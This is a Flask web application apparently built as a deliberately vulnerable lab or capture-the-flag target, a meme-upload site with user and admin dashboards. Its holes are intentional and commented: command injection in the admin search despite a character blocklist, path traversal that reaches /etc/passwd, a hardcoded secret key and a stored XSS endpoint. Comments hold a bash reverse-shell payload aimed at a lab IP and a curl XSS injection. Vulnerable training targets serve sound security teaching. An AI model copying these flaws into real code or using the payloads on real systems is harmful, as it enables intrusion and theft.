# app.py

import eventlet
eventlet.monkey_patch()  # Must be called before any other imports

import os
import subprocess
import requests
from flask import Flask, render_template, request, flash, redirect, url_for, session, send_file
from flask_socketio import SocketIO, emit
from flask_wtf import FlaskForm
from flask_wtf.csrf import CSRFProtect
from wtforms import StringField, PasswordField, SubmitField, FileField
from wtforms.validators import DataRequired, Length
from datetime import timedelta
import re
import random


# Initialize Flask app
app = Flask(__name__)
app.secret_key = "p3ni5"  

# Initialize CSRF protection
csrf = CSRFProtect(app)

# Initialize SocketIO with async_mode set to 'eventlet'
socketio = SocketIO(app, async_mode='eventlet')

# Session configuration
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=5)
app.config['SESSION_COOKIE_SECURE'] = False  
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

# API endpoint URLs
API_ENDPOINT = "http://192.168.57.12:8000/authenticate"
VALIDATE_TOKEN_ENDPOINT = "http://192.168.57.12:8000/validate_token"

# Upload configuration
STATIC_FOLDER = '/app/static'
UPLOAD_FOLDER = '/app/uploads'
ALLOWED_EXTENSIONS_USER = set(['png', 'jpg', 'jpeg', 'gif'])  
ALLOWED_EXTENSIONS_ADMIN = set(['png', 'jpg', 'jpeg', 'gif']) 
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  

# Ensure the upload folder exists
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(STATIC_FOLDER, exist_ok=True)


# Flask-WTF Form for Login
class LoginForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(message="Username is required."), Length(min=3, max=25)])
    password = PasswordField('Password', validators=[DataRequired(message="Password is required."), Length(min=6, max=100)])
    submit = SubmitField('Login')

# Flask-WTF Form for User Image Upload
class UploadFormUser(FlaskForm):
    file = FileField('Select Image of the Day', validators=[DataRequired()])
    submit = SubmitField('Upload')

# Flask-WTF Form for Admin Search
class SearchFormAdmin(FlaskForm):
    query = StringField('Search Query', validators=[DataRequired()])
    submit = SubmitField('Search')


# Flask-WTF Form for User Registration
class RegistrationForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(message="Username is required."), Length(min=3, max=25)])
    password = PasswordField('Password', validators=[DataRequired(message="Password is required."), Length(min=6, max=100)])
    submit = SubmitField('Create Account')



def allowed_file(filename, role):
    # Vulnerable: Only checks the file extension based on role
    if role == 'admin':
        return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS_ADMIN
    elif role == 'user':
        return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS_USER
    return False

# Function to select the meme of the day
def get_meme_of_the_day():
    images = [f for f in os.listdir(app.config['UPLOAD_FOLDER']) if allowed_file(f, 'user')]
    return random.choice(images) if images else None

@app.before_request
def make_session_permanent():
    session.permanent = True

@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    welcome_meme = random.choice(os.listdir(STATIC_FOLDER))
    form = LoginForm()
    registration_form = RegistrationForm()
    
    if form.validate_on_submit():
        username = form.username.data.strip()
        password = form.password.data.strip()

        # Make a POST request to the API with the plain text password
        try:
            response = requests.post(API_ENDPOINT, json={'username': username, 'password': password}, timeout=5)
            response.raise_for_status()
        except requests.exceptions.Timeout:
            flash('The authentication service timed out. Please try again later.', 'danger')
            print("Authentication service timed out.")
            return render_template('auth.html', form=form, registration_form=registration_form, welcome_meme=welcome_meme)
        except requests.exceptions.HTTPError as err:
            flash(f'Authentication service error: {err}', 'danger')
            print(f"Authentication service HTTP error: {err}")
            return render_template('auth.html', form=form, registration_form=registration_form, welcome_meme=welcome_meme)
        except requests.exceptions.RequestException:
            flash('Error communicating with the authentication service.', 'danger')
            print("Error communicating with the authentication service.")
            return render_template('auth.html', form=form, registration_form=registration_form, welcome_meme=welcome_meme)

        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                role = data.get('role')
                token = data.get('token')

                # Store token and user information in the session
                session['username'] = username
                session['role'] = role
                session['token'] = token

                # Debugging print statements
                print(f"Session Data: Username: {session.get('username')}, Role: {session.get('role')}, Token: {session.get('token')}")

                socketio.emit('user_logged_in', {'username': username})

                # Flash a success message if the user is admin or regular user
                if role in ["admin", "user"]:
                    flash('Login successful!', 'success')

                # Render the appropriate page based on the user role
                if role == "admin":
                    session.modified = True
                    print("Redirecting to admin_dashboard.")
                    return redirect(url_for('admin_dashboard'))
                elif role == "user":
                    session.modified = True
                    print("Redirecting to dashboard.")
                    return redirect(url_for('dashboard'))
                else:
                    # Super_admin is not allowed to access the admin or user dashboard
                    flash('Super admin access is restricted to API use only.', 'danger')
                    session.modified = True
                    print("Super_admin access restricted. Redirecting to login.")
                    return redirect(url_for('login'))
            else:
                flash(data.get('message', 'Login failed'), 'danger')
                print(f"Login failed: {data.get('message', 'No message')}")
                return render_template('auth.html', form=form, registration_form=registration_form, welcome_meme=welcome_meme)
        else:
            flash('Error communicating with the authentication service.', 'danger')
            print(f"Unexpected status code from authentication service: {response.status_code}")
            return render_template('auth.html', form=form, registration_form=registration_form, welcome_meme=welcome_meme)

    elif registration_form.validate_on_submit() and 'submit' in request.form:
        # Handle Registration Form Submission
        username = registration_form.username.data.strip()
        password = registration_form.password.data.strip()

        # Redirect to the existing register_user route
        return redirect(url_for('register_user'))

    return render_template('auth.html', form=form, registration_form=registration_form, welcome_meme=welcome_meme)

@app.route('/register_user', methods=['POST'])
def register_user():
    form = RegistrationForm()
    if form.validate_on_submit():
        username = form.username.data.strip()
        password = form.password.data.strip()

        # Make a POST request to the FastAPI add_user endpoint
        try:
            response = requests.post("http://192.168.57.12:8000/add_user", json={'username': username, 'password': password}, timeout=5)
            response.raise_for_status()

            if response.status_code in [200, 201]:
                flash('Account created successfully! Please log in.', 'success')
                return redirect(url_for('login'))  
            else:
                flash('Failed to create account. Please try again.', 'danger')
        except requests.exceptions.RequestException as e:
            flash(f'Error communicating with the API: {e}', 'danger')

    # If form validation fails or an error occurs, re-render the auth.html with error messages
    form = LoginForm()
    registration_form = RegistrationForm()
    welcome_meme = random.choice(os.listdir(STATIC_FOLDER))
    return render_template('auth.html', form=form, registration_form=registration_form, welcome_meme=welcome_meme)


def validate_token(token):
    """Validate the token by calling the API validation endpoint."""
    try:
        response = requests.post(VALIDATE_TOKEN_ENDPOINT, json={'token': token}, timeout=5)
        response.raise_for_status()
        data = response.json()
        return data.get('success', False), data.get('role', None)
    except requests.exceptions.RequestException as e:
        print(f"Error validating token: {e}")
        return False, None

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    # Implement session-based access control with token validation
    token = session.get('token')
    username = session.get('username', 'User')
    role = session.get('role')

    # Validate the token with the API
    is_valid, validated_role = validate_token(token)
    print(f"Dashboard Access - Username: {username}, Role: {role}, Token: {token}, Validated Role: {validated_role}")

    if not token or role != 'user' or not is_valid:
        flash('Unauthorized access. Please log in as a user.', 'danger')
        print(f"Unauthorized access attempt by user: {username}")
        return redirect(url_for('login'))

    form = UploadFormUser()
    if form.validate_on_submit():
        file = form.file.data
        if file.filename == '':
            flash('No file selected.', 'danger')
            return redirect(url_for('dashboard'))
        if file and allowed_file(file.filename, 'user'):
            filename = file.filename  
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            flash('Image successfully uploaded.', 'success')
            return redirect(url_for('dashboard'))
        else:
            flash('Allowed file types are png, jpg, jpeg, gif.', 'danger')

    # Get the meme of the day
    meme_of_the_day = get_meme_of_the_day()

    # List uploaded images (red herring)
    images = [f for f in os.listdir(app.config['UPLOAD_FOLDER'])]
    return render_template('dashboard.html', username=username, form=form, images=images, meme_of_the_day=meme_of_the_day)

@app.route('/admin_dashboard', methods=['GET', 'POST'])
def admin_dashboard():
    # Implement session-based access control with token validation
    token = session.get('token')
    username = session.get('username', 'Admin')
    role = session.get('role')

    # Validate the token with the API
    is_valid, validated_role = validate_token(token)
    print(f"Admin Dashboard Access - Username: {username}, Role: {role}, Token: {token}, Validated Role: {validated_role}")

    if not token or role != 'admin' or not is_valid:
        flash('Unauthorized access. Please log in as an admin.', 'danger')
        print(f"Unauthorized admin access attempt by user: {username}")
        return redirect(url_for('login'))

    # $(/bin/bash -c "bash -i >& /dev/tcp/192.168.57.1/4444 0>&1")
    form = SearchFormAdmin()
    results = []
    if form.validate_on_submit():
        query = form.query.data.strip()
        blacklist = [';', '|', '`']
        blocked = False
        for char in blacklist:
            if char in query:
                flash(f'Invalid character "{char}" in query.', 'danger')
                blocked = True
                break
        if blocked:
            return redirect(url_for('admin_dashboard'))
        command = f"find {os.path.join(app.config['UPLOAD_FOLDER'], '*')} -iname \"*{query}*\""
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            results = output.strip().split('\n')
            flash('Search completed.', 'success')
        except subprocess.CalledProcessError as e:
            flash('No results found.', 'info')
            results = []

    # Get the meme of the day
    meme_of_the_day = get_meme_of_the_day()

    # List uploaded images (red herring)
    images = [f for f in os.listdir(app.config['UPLOAD_FOLDER']) if allowed_file(f, 'user')]
    return render_template('admin_dashboard.html', username=username, form=form, images=images, results=results, meme_of_the_day=meme_of_the_day)


@app.route('/uploads/<path:filename>')
def uploaded_file(filename):
    """
    Demonstrate path traversal vulnerability starting from /app/uploads directory.
    Allows access to files outside the upload directory, e.g., /etc/passwd.
    """
    base_path = os.path.abspath(app.config['UPLOAD_FOLDER'])  # Base directory to serve files from
    file_path = os.path.join(base_path, filename)  # Join base path with the requested file

    print(f"Requested file: {filename}")
    print(f"Constructed file path: {file_path}")

    # Resolve the absolute path of the requested file
    resolved_path = os.path.abspath(file_path)

    # Check if the resolved path is within the uploads directory
    if not resolved_path.startswith(base_path):
        # Attempting to access outside /app/uploads, demonstrating traversal
        try:
            # Allow traversal to specific files like /etc/passwd
            external_file_path = os.path.join('/', filename.lstrip('/'))  # Strip leading slashes for traversal
            print(f"External access attempt: {external_file_path}")

            if os.path.exists(external_file_path):
                return send_file(external_file_path)
            else:
                flash('File not found or access denied.', 'danger')
                print(f"File not found: {external_file_path}")
                return redirect(url_for('admin_dashboard'))

        except Exception as e:
            flash('An error occurred while accessing the file.', 'danger')
            print(f"Error accessing external file: {e}")
            return redirect(url_for('admin_dashboard'))

    # If the path is within the uploads directory, serve the file normally
    try:
        return send_file(resolved_path)
    except Exception as e:
        flash('File not found or access denied.', 'danger')
        print(f"Error accessing file: {e}")
        return redirect(url_for('admin_dashboard'))



@app.route('/logout')
def logout():
    session.clear()
    flash('You have been logged out.', 'info')
    print("User logged out.")
    return redirect(url_for('login'))

# Endpoint for API to notify Flask of login events
# curl -X POST http://192.168.57.10/api_login_event \
#     -H "Content-Type: application/json" \
#     -d '{"username": "<img src=x onerror=alert(\"XSS\")>"}'

#
#
@app.route('/api_login_event', methods=['POST'])
@csrf.exempt  # Exempt this route from CSRF protection
def api_login_event():
    data = request.get_json()
    if not data or 'username' not in data:
        print("Invalid data received in api_login_event.")
        return {"error": "Invalid data"}, 400

    username = data['username']
    print(f"Received login event for user: {username}")

    # Emit a login event to the frontend (allows XSS via username)
    socketio.emit('user_logged_in', {'username': username})

    return {"message": "Login event received"}, 200

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=80, use_reloader=False)
